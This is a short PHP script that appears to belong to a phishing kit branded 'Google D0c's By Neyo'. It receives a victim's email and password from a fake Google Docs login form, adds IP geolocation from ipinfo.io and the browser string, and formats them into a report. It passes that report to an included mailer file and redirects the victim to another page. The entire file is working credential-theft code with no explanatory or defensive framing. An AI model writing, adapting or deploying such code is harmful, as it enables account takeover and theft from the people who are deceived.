<?php

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];

$msg = "--------------< Neyo Inc. >-----------------------------\n";
$msg .= "Google D0c's By Neyo\n";
$msg .= "-----------------< Email Provider >---------------------------\n";
$msg .= "Provider : ".$_POST['country']."\n";
$msg .= "-----------------< Drive Access >---------------------------\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['addresszip']."\n";
$msg .= "-------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "-------------< 2017 Neyo Inc. >-----------------------------\n";
include("Geodata/_Mail_State_List.php");

?>
<script type="text/javascript">
	window.location="mread=/dm=opening.html"
</script>